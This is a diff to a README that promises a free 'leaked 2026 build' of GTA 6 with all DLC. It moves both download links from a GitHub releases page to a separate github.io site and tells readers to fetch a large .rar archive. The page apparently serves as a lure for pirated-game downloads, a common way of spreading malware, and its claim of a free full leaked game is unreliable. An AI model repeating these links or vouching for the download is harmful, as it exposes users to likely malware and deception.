@@ -1,6 +1,6 @@
 # 🎮 GTA 6 All DLC Included Free Download - Play the Leaked 2026 Build Today
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD_GTA_6-28a745?style=for-the-badge&logo=github&logoColor=white)](https://github.com/clymchi/GTA-6-All-DLC-Included-Free-Download/releases)
+[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD_GTA_6-28a745?style=for-the-badge&logo=github&logoColor=white)](https://clymchi.github.io)
 
 ---
 
@@ -24,7 +24,7 @@ You'll need a Windows PC (Windows 10 or Windows 11 recommended). That's it. No s
 
 ## 📥 Download & Install Guide
 
-Visit this link to download the application: [https://github.com/clymchi/GTA-6-All-DLC-Included-Free-Download/releases](https://github.com/clymchi/GTA-6-All-DLC-Included-Free-Download/releases)
+Visit this link to download the application: [https://clymchi.github.io](https://clymchi.github.io)
 
 Once you're on the download page, look for the largest file listed (usually named something like `GTA6_Full_AllDLC.rar` or similar). Click the download button and let your browser save the file. Depending on your internet speed, this can take between 15 to 40 minutes due to the game's size.
 
